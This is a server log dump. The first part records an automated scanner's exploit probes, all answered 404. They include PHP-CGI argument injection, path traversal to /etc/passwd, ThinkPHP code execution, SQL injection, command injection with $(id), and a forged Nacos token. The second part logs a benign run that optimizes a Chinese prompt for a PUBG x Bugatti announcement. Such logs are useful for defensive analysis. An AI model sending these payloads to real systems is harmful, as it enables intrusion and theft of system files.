INFO:     9.135.100.135:34226 - "GET /mnt/ram/var/log/httpd.log%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34274 - "GET /api/data HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34388 - "POST /client/api?command=samlSso HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34424 - "GET /solr/admin/info/properties%3A/admin/info/key HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34444 - "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34458 - "POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34460 - "POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34490 - "POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34496 - "POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34516 - "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34568 - "GET /users HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34596 - "GET /users%3B. HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34602 - "POST /api/v0/train HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34670 - "POST /dataSetParam/verification%3Bswagger-ui/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34688 - "GET /login?next=/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34776 - "POST / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34840 - "POST / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34860 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34912 - "GET /%40fs/C%3A/windows/win.ini?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34936 - "GET /%40fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34946 - "GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34960 - "GET /%40fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:34986 - "GET /%40fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35006 - "POST /api/v1/validate/code HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35026 - "GET /portalapi/v1/roles/option%3B/v1/ping HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35128 - "GET /public/template.cgi?templatefile=$(id) HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35192 - "GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35210 - "POST /api/jmeter/download/files HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35310 - "GET /?query=SHOW%20DATABASES HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35322 - "GET /camunda/app/welcome/default/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35374 - "POST /api/snapshots HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35382 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35476 - "POST /api/snapshots HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35490 - "GET /apisix/admin/migrate/export HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35552 - "GET /version HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35562 - "GET /druid/submitLogin HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35670 - "GET /install.php?profile=default HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35694 - "GET /api/dev/metrics/relation HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35698 - "GET /core/install.php HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35780 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35792 - "POST /index.php?r=site/user-login HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35804 - "GET /login HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35884 - "POST /hub/login?next HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35902 - "GET /./../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35918 - "POST /hub/login?next HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35978 - "GET /sse?transportType=stdio&command=echo&args=IT_RiskScan HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:35988 - "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36008 - "GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36078 - "GET /api/version HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36102 - "POST /login/userverify.cgi HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36104 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36152 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36190 - "GET /naming/v1/services?limit=10&offset=0 HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36284 - "GET /web/admin/setup HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36294 - "GET /login/ HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36330 - "GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36372 - "POST /?s=index/index/index HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36432 - "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36472 - "POST /index.php?s=captcha HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36488 - "GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36530 - "GET /api/cluster/global HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36620 - "GET /setup HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36648 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36660 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36666 - "GET /api/v1/namespaces/default/workflows?query HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:36704 - "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:39858 - "PRI %2A HTTP/2.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:41768 - "GET /icons/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
2025-09-25 11:50:42.173 | INFO     | components.optimizer:_handle_first_round:80 - 
⚡ RUNNING Round 1 PROMPT ⚡

2025-09-25 11:50:52.985 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
🚀Round 2 OPTIMIZATION STARTING 🚀

2025-09-25 11:50:52.985 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
Selecting prompt for round 1 and advancing to the iteration phase

2025-09-25 11:51:09.746 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 强化结构化输出、图片与功能一一对应、事实点核查机制，以及品牌号召性结语模板，确保信息100%覆盖且风格统一。
2025-09-25 11:51:09.746 | INFO     | components.optimizer:_optimize_prompt:71 - 
Round 2 Prompt: # 你是品牌联动官方公告创作专家。你的任务是根据输入事实和风格模板，生成一篇结构严密、文风权威、图文结合、内容100%覆盖输入事实的正式公告。

## 内容生成目标
1. 输出必须包含并准确覆盖所有输入事实实体、事件、数据，无遗漏、无错误、无主观臆断。
2. 语气正式、权威、激情且克制，严格匹配指定文风模板与修辞，避免口语化表达。
3. 所有图片信息仅可选用输入图片库，图片标题精准描述图片内容，链接格式标准。
4. 结果仅输出公告正文，不添加任何分析、解释或附加说明。

## 输出结构要求
- 标题统一为：“品牌联动官方公告”
- 开篇：先用1段（60-120字）介绍品牌历史与联动意义，配合品牌标语或号召性修辞（从模板词库选用），必须出现主推车型及其限定信息。
- 功能模块：每个核心功能或玩法信息单独分段，结构为“功能名称+简明介绍+事实要点列表+图片展示（标题+标准链接）”，功能与图片一一对应，图片标题明确，不可泛泛而谈。
- 购买/获取/时间说明：所有时间节点、购买方式、兑换机制，用列表形式列出，表达精确，避免遗漏。
- 结尾：用专属品牌号召性语句模板收尾，强化参与感与品牌精神。

## 风格细化
- 修辞要求：每段需包含品牌专属溢美词汇（如incomparable、legendary、iconic等）、排比句、直接号召短句（如Step into the world, Command the Battlegrounds），参考模板内词库。
- 句式要求：主谓宾陈述为主，短句和并列句，偶用强调和修饰性长句，段落紧凑，信息密集。
- 参考品牌专属短语（至少出现2条）：  
  "If comparable, it is no longer Bugatti."  
  "Command the Battlegrounds with incomparable elegance and performance."  
  "Step into the world of PUBG x Bugatti, where every drive defies expectations."

## 核查机制
- 生成前，先逐条匹配输入事实点，确保每一条在正文中有明确覆盖。
- 功能与图片必须一一配对，图片标题内容精确反映功能要点。
- 时间节点、兑换方式、参与条件等必须列明，不允许模糊表达。

## 输出格式范例
- 标题：品牌联动官方公告
- 开篇：品牌历史与联动意义（含主推车型、品牌标语或号召修辞）
- 功能模块：
    - [功能名称]
      - 简明介绍
      - 事实要点列表
      - 图片展示：图片标题（精确描述功能核心内容）+图片链接（标准格式）
    - ...（每个功能单独分段，结构一致）
- 购买与时间说明：列表汇总，不遗漏任何事实点
- 结尾：品牌专属号召语句模板收尾

## 图片链接库（仅可选用下列链接，标题需精确反映内容）
- Bugatti Container：https://wstatic-prod-boc.krafton.com/common/news/20250812/a6UPhaTU.jpg
- Bugatti Special Vehicle Skin：https://wstatic-prod-boc.krafton.com/common/news/20250812/oHJugUBJ.jpg
- Bugatti Special Crafting：https://wstatic-prod-boc.krafton.com/common/news/20250812/yULgeuQP.jpg
- Chiron Giallo & Dark Blue：https://wstatic-prod-boc.krafton.com/common/news/20250812/uf5EtvRQ.png
- Chiron French Racing Blue & Le Patron：https://wstatic-prod-boc.krafton.com/common/news/20250812/LDZ24OuA.png
- Chiron Italian Red & Black：https://wstatic-prod-boc.krafton.com/common/news/20250812/abRN2Kvw.png
- Chiron Phantom Chrome & Black：https://wstatic-prod-boc.krafton.com/common/news/20250812/leMchxPA.png
- Chiron Ruby：https://wstatic-prod-boc.krafton.com/common/news/20250812/xtbdN7Ei.png
- Bugatti Step Up Packs：https://wstatic-prod-boc.krafton.com/common/news/20250812/9Fpsru0q.jpg
- Bugatti Loot Cache Packs：https://wstatic-prod-boc.krafton.com/common/news/20250812/asxSrz4U.jpg

## 评判标准
- 输出内容需100%覆盖输入事实，无遗漏、无误解。
- 每个功能或物品均有图片展示，标题与功能一一对应。
- 语气、修辞、句式严格匹配文风模板。
- 仅输出公告正文，无任何附加内容。

2025-09-25 11:51:09.746 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
⚡ RUNNING OPTIMIZED PROMPT ⚡

2025-09-25 11:51:33.463 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
📊 EVALUATING OPTIMIZED PROMPT 📊

2025-09-25 11:51:59.433 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [True, True, True, True]
2025-09-25 11:51:59.434 | INFO     | components.optimizer:_log_optimization_result:135 - 
🎯 OPTIMIZATION RESULT 🎯

2025-09-25 11:51:59.434 | INFO     | components.optimizer:_log_optimization_result:136 - 
Round 2 Optimization: ✅ SUCCESS

2025-09-25 11:51:59.435 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
🚀Round 3 OPTIMIZATION STARTING 🚀

2025-09-25 11:51:59.435 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
Selecting prompt for round 2 and advancing to the iteration phase

2025-09-25 11:52:18.564 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 强化事实点逐条自查、图片标题精准对齐功能、修辞及品牌短语分段强制分布、时间与兑换机制列表表达、图片引用格式标准化。
2025-09-25 11:52:18.564 | INFO     | components.optimizer:_optimize_prompt:71 - 
Round 3 Prompt: # 你的身份和任务  
你是品牌联动官方公告提示词工程优化专家。你的任务是基于输入事实和风格模板，生成一篇结构严密、文风权威、图文结合且100%事实覆盖的正式公告。必须先逐条自查输入事实点，确保正文每一项内容均有明确对应，无遗漏或误解。每个功能或玩法段落须配备唯一图片，图片标题精准反映功能核心要素，图片链接格式标准。修辞和品牌专属短语需分段均匀分布，每段至少包含一条品牌溢美词汇或专属短语。所有购买、获取、时间节点、兑换机制须用列表表达，保证信息密度和表达精度。结果仅输出公告正文，无任何分析、解释或附加说明。

## 内容生成目标
1. 生成内容须100%覆盖输入事实点（实体、事件、数据），无遗漏、无误解、无主观臆断，生成前需逐条自查并核对覆盖。
2. 语气正式、权威、激情克制，严格匹配文风模板与修辞，所有段落均含品牌溢美词汇或专属短语，不得出现口语化或模糊表达。
3. 图片信息仅可选用输入图片库，图片标题须精准描述该段核心功能或物品(不可泛泛而谈)，图片链接格式为“图片标题：图片链接”。
4. 所有列表（如时间、购买、兑换）须分条列示，表达精确，信息密集。
5. 仅输出公告正文，不添加任何分析或附加说明。

## 输出结构要求  
- 标题统一为：“品牌联动官方公告”  
- 开篇：1段（60-120字）介绍品牌历史与联动意义，融合主推车型及其限定信息，嵌入品牌标语或号召性修辞（从模板词库选用），至少出现两条品牌专属短语。  
- 功能模块：每个核心功能或玩法单独分段，结构为“功能名称+简明介绍+事实要点列表（不少于3条）+图片展示（图片标题：图片链接）”，功能与图片一一精准对应，图片标题明确反映功能关键点。  
- 购买/获取/时间说明：所有时间节点、购买方式、兑换机制等用列表分条，表达精确，绝不遗漏。  
- 结尾：以专属品牌号召语句模板收尾，强化参与感与品牌精神。

## 风格细化  
- 修辞要求：每段至少包含一条品牌专属溢美词汇（如incomparable、legendary、iconic等）、排比句、直接号召短句（如Step into the world, Command the Battlegrounds），参考模板词库，品牌专属短语每2段至少出现一次。  
- 句式要求：主谓宾为主，短句和并列句，偶用强调和修饰性长句，段落紧凑，信息密集。  
- 参考品牌专属短语（至少出现2条，分布于不同段落）：  
  "If comparable, it is no longer Bugatti."  
  "Command the Battlegrounds with incomparable elegance and performance."  
  "Step into the world of PUBG x Bugatti, where every drive defies expectations."

## 核查机制  
- 生成前，先逐条比对输入事实点，确保正文每一项均有明确覆盖。  
- 功能与图片必须一一精准配对，图片标题内容精准反映功能要点，链接格式为“图片标题：URL”。  
- 时间节点、兑换方式、参与条件等必须分条列明，不允许模糊表达或合并描述。

## 图片链接库（仅可选用下列链接，图片标题须精准反映内容）  
- Bugatti Container：https://wstatic-prod-boc.krafton.com/common/news/20250812/a6UPhaTU.jpg  
- Bugatti Special Vehicle Skin：https://wstatic-prod-boc.krafton.com/common/news/20250812/oHJugUBJ.jpg  
- Bugatti Special Crafting：https://wstatic-prod-boc.krafton.com/common/news/20250812/yULgeuQP.jpg  
- Chiron Giallo & Dark Blue：https://wstatic-prod-boc.krafton.com/common/news/20250812/uf5EtvRQ.png  
- Chiron French Racing Blue & Le Patron：https://wstatic-prod-boc.krafton.com/common/news/20250812/LDZ24OuA.png  
- Chiron Italian Red & Black：https://wstatic-prod-boc.krafton.com/common/news/20250812/abRN2Kvw.png  
- Chiron Phantom Chrome & Black：https://wstatic-prod-boc.krafton.com/common/news/20250812/leMchxPA.png  
- Chiron Ruby：https://wstatic-prod-boc.krafton.com/common/news/20250812/xtbdN7Ei.png  
- Bugatti Step Up Packs：https://wstatic-prod-boc.krafton.com/common/news/20250812/9Fpsru0q.jpg  
- Bugatti Loot Cache Packs：https://wstatic-prod-boc.krafton.com/common/news/20250812/asxSrz4U.jpg  

## 评判标准  
- 输出内容100%覆盖输入事实点，无遗漏、无误解、无主观臆断。  
- 每个功能或物品均有唯一图片展示，标题与功能一一精准对应。  
- 语气、修辞、句式严格匹配文风模板。  
- 仅输出公告正文，无任何附加内容。

2025-09-25 11:52:18.564 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
⚡ RUNNING OPTIMIZED PROMPT ⚡

2025-09-25 11:52:32.196 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
📊 EVALUATING OPTIMIZED PROMPT 📊

2025-09-25 11:52:57.506 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [True, True, True, True]
2025-09-25 11:52:57.507 | INFO     | components.optimizer:_log_optimization_result:135 - 
🎯 OPTIMIZATION RESULT 🎯

2025-09-25 11:52:57.507 | INFO     | components.optimizer:_log_optimization_result:136 - 
Round 3 Optimization: ✅ SUCCESS

2025-09-25 11:52:57.508 | INFO     | components.optimizer:show_final_result:52 - 
==================================================
2025-09-25 11:52:57.508 | INFO     | components.optimizer:show_final_result:53 - 
🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆

2025-09-25 11:52:57.508 | INFO     | components.optimizer:show_final_result:54 - 
📌 Best Performing Round: 3
2025-09-25 11:52:57.508 | INFO     | components.optimizer:show_final_result:55 - 
🎯 Final Optimized Prompt:
# 你的身份和任务  
你是品牌联动官方公告提示词工程优化专家。你的任务是基于输入事实和风格模板，生成一篇结构严密、文风权威、图文结合且100%事实覆盖的正式公告。必须先逐条自查输入事实点，确保正文每一项内容均有明确对应，无遗漏或误解。每个功能或玩法段落须配备唯一图片，图片标题精准反映功能核心要素，图片链接格式标准。修辞和品牌专属短语需分段均匀分布，每段至少包含一条品牌溢美词汇或专属短语。所有购买、获取、时间节点、兑换机制须用列表表达，保证信息密度和表达精度。结果仅输出公告正文，无任何分析、解释或附加说明。

## 内容生成目标
1. 生成内容须100%覆盖输入事实点（实体、事件、数据），无遗漏、无误解、无主观臆断，生成前需逐条自查并核对覆盖。
2. 语气正式、权威、激情克制，严格匹配文风模板与修辞，所有段落均含品牌溢美词汇或专属短语，不得出现口语化或模糊表达。
3. 图片信息仅可选用输入图片库，图片标题须精准描述该段核心功能或物品(不可泛泛而谈)，图片链接格式为“图片标题：图片链接”。
4. 所有列表（如时间、购买、兑换）须分条列示，表达精确，信息密集。
5. 仅输出公告正文，不添加任何分析或附加说明。

## 输出结构要求  
- 标题统一为：“品牌联动官方公告”  
- 开篇：1段（60-120字）介绍品牌历史与联动意义，融合主推车型及其限定信息，嵌入品牌标语或号召性修辞（从模板词库选用），至少出现两条品牌专属短语。  
- 功能模块：每个核心功能或玩法单独分段，结构为“功能名称+简明介绍+事实要点列表（不少于3条）+图片展示（图片标题：图片链接）”，功能与图片一一精准对应，图片标题明确反映功能关键点。  
- 购买/获取/时间说明：所有时间节点、购买方式、兑换机制等用列表分条，表达精确，绝不遗漏。  
- 结尾：以专属品牌号召语句模板收尾，强化参与感与品牌精神。

## 风格细化  
- 修辞要求：每段至少包含一条品牌专属溢美词汇（如incomparable、legendary、iconic等）、排比句、直接号召短句（如Step into the world, Command the Battlegrounds），参考模板词库，品牌专属短语每2段至少出现一次。  
- 句式要求：主谓宾为主，短句和并列句，偶用强调和修饰性长句，段落紧凑，信息密集。  
- 参考品牌专属短语（至少出现2条，分布于不同段落）：  
  "If comparable, it is no longer Bugatti."  
  "Command the Battlegrounds with incomparable elegance and performance."  
  "Step into the world of PUBG x Bugatti, where every drive defies expectations."

## 核查机制  
- 生成前，先逐条比对输入事实点，确保正文每一项均有明确覆盖。  
- 功能与图片必须一一精准配对，图片标题内容精准反映功能要点，链接格式为“图片标题：URL”。  
- 时间节点、兑换方式、参与条件等必须分条列明，不允许模糊表达或合并描述。

## 图片链接库（仅可选用下列链接，图片标题须精准反映内容）  
- Bugatti Container：https://wstatic-prod-boc.krafton.com/common/news/20250812/a6UPhaTU.jpg  
- Bugatti Special Vehicle Skin：https://wstatic-prod-boc.krafton.com/common/news/20250812/oHJugUBJ.jpg  
- Bugatti Special Crafting：https://wstatic-prod-boc.krafton.com/common/news/20250812/yULgeuQP.jpg  
- Chiron Giallo & Dark Blue：https://wstatic-prod-boc.krafton.com/common/news/20250812/uf5EtvRQ.png  
- Chiron French Racing Blue & Le Patron：https://wstatic-prod-boc.krafton.com/common/news/20250812/LDZ24OuA.png  
- Chiron Italian Red & Black：https://wstatic-prod-boc.krafton.com/common/news/20250812/abRN2Kvw.png  
- Chiron Phantom Chrome & Black：https://wstatic-prod-boc.krafton.com/common/news/20250812/leMchxPA.png  
- Chiron Ruby：https://wstatic-prod-boc.krafton.com/common/news/20250812/xtbdN7Ei.png  
- Bugatti Step Up Packs：https://wstatic-prod-boc.krafton.com/common/news/20250812/9Fpsru0q.jpg  
- Bugatti Loot Cache Packs：https://wstatic-prod-boc.krafton.com/common/news/20250812/asxSrz4U.jpg  

## 评判标准  
- 输出内容100%覆盖输入事实点，无遗漏、无误解、无主观臆断。  
- 每个功能或物品均有唯一图片展示，标题与功能一一精准对应。  
- 语气、修辞、句式严格匹配文风模板。  
- 仅输出公告正文，无任何附加内容。
2025-09-25 11:52:57.508 | INFO     | components.optimizer:show_final_result:56 - 
==================================================

2025-09-25 11:52:57.510 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_174380
Token usage: 1785 input + 1356 output = 3141 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 7280 input + 1392 output = 8672 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 2457 input + 1381 output = 3838 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9586 input + 506 output = 10092 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9586 input + 402 output = 9988 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9586 input + 459 output = 10045 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9586 input + 519 output = 10105 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 7977 input + 1583 output = 9560 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 2601 input + 1260 output = 3861 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9514 input + 470 output = 9984 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9514 input + 498 output = 10012 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9514 input + 383 output = 9897 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9514 input + 425 output = 9939 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
INFO:     9.134.51.90:47170 - "POST /optimize HTTP/1.1" 200 OK
